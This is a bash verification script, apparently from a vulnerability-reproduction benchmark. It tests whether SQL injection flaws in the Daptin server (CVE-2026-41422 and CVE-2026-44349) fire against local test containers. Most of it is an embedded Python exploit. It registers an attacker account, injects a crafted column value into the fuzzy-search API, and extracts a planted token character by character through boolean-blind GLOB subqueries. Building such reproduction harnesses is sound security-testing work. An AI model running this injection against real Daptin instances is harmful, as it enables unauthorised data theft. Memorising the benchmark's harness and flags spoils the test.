#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2026-41422 GET /aggregate/world?column=(SELECT token FROM pcb_canary ...)
# residual: CVE-2026-44349 fuzzy-search column boolean-blind SQLi (inline literal)
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PCB_FLAG="${PCB_FLAG:-$RUN_FLAG}"
export PCB_CASE_DIR="$CASE_DIR"

SVC="$VERSION"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
case "$VERSION" in
  v0) PORT="${PORT:-${PORT_V0_0:-}}";;
  v1) PORT="${PORT:-${PORT_V1_0:-}}";;
  v2) PORT="${PORT:-${PORT_V2_0:-}}";;
esac
export PCB_TARGET_PORT="${PORT:-}"
[[ -n "${PCB_TARGET_PORT}" ]] || { echo "verify: no published Daptin port" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # CVE-2026-44349: V1 processFuzzySearch still interpolates user column names into
  # goqu.L(fmt.Sprintf("LOWER(%s) LIKE ?", prefix+col)) with no whitelist. A
  # boolean-blind GLOB subquery on pcb_canary.token extracts the planted flag.
  # V2 (0.11.5) GetColumnByName rejects the injection. Inline literal only.
  CAND='{"probe_id":"cve-2026-44349-fuzzy-column-sqli","method":"GET","endpoint":"api","entity":"world","operator":"fuzzy","value":"XYZNOEXIST","column":"table_name) LIKE '"'"'XYZNOEXIST'"'"' OR (SELECT token FROM pcb_canary ORDER BY id DESC LIMIT 1) GLOB '"'"'PCBFLAG_*'"'"' OR LOWER(table_name"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" - "$CAND" "$PCB_TARGET_PORT" <<'PYEOF'
import json, sys, urllib.parse, urllib.request, urllib.error, time

cand = json.loads(sys.argv[1])
port = sys.argv[2]
base = f"http://127.0.0.1:{port}"
CHARSET = "0123456789abcdefPCBFLAG_"
ADMIN_EMAIL, ADMIN_PW = "admin@pcb.test", "PcbAdm1n!Str0ng9"
ATT_EMAIL, ATT_PW = "attacker@pcb.test", "Att4ck3r!PwD9"


def _req(method, url, headers=None, body=None, timeout=20):
    req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") if e.fp else ""
        return e.code, raw
    except Exception:
        return 0, ""


def _register(name, email, pw):
    _req("POST", f"{base}/action/user_account/signup",
         headers={"Content-Type": "application/json"},
         body=json.dumps({"attributes": {
             "name": name, "email": email,
             "password": pw, "passwordConfirm": pw}}).encode())


def _login(email, pw):
    _, text = _req("POST", f"{base}/action/user_account/signin",
                   headers={"Content-Type": "application/json"},
                   body=json.dumps({"attributes": {"email": email, "password": pw}}).encode())
    try:
        parsed = json.loads(text)
    except Exception:
        return ""
    items = parsed if isinstance(parsed, list) else [parsed]
    for item in items:
        if isinstance(item, dict) and item.get("ResponseType") == "client.store.set":
            val = (item.get("Attributes") or {}).get("value")
            if isinstance(val, str) and val:
                return val
    return ""


def _fuzzy_total(token, col_inj):
    query = json.dumps([{"column": col_inj, "operator": "fuzzy", "value": "XYZNOEXIST"}])
    url = f"{base}/api/world?query={urllib.parse.quote(query)}&page%5Bsize%5D=1"
    _, text = _req("GET", url, headers={"Authorization": f"Bearer {token}"}, timeout=30)
    try:
        return json.loads(text).get("links", {}).get("total", 0)
    except Exception:
        return 0


def _col(prefix, ch):
    glob_pat = (prefix + ch).replace("[", "[[]").replace("*", "[*]").replace("?", "[?]") + "*"
    return (
        "table_name) LIKE 'XYZNOEXIST' "
        f"OR (SELECT token FROM pcb_canary ORDER BY id DESC LIMIT 1) GLOB '{glob_pat}' "
        "OR LOWER(table_name"
    )


try:
    _register("attacker", ATT_EMAIL, ATT_PW)
    token = _login(ATT_EMAIL, ATT_PW)
    if not token:
        print(json.dumps({"status": 0, "body": "login failed"}))
        sys.exit(0)
    test_inj = "table_name) LIKE 'XYZNOEXIST' OR 1=1 OR LOWER(table_name"
    if _fuzzy_total(token, test_inj) <= 0:
        print(json.dumps({"status": 200, "body": "", "sqli_works": False}))
        sys.exit(0)
    extracted = ""
    for _ in range(64):
        found = False
        for ch in CHARSET:
            if _fuzzy_total(token, _col(extracted, ch)) > 0:
                extracted += ch
                found = True
                break
        if not found:
            break
    print(json.dumps({"status": 200, "body": extracted, "sqli_works": True}))
except Exception as e:
    print(json.dumps({"status": 0, "body": "", "error": str(e)}))
PYEOF
)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
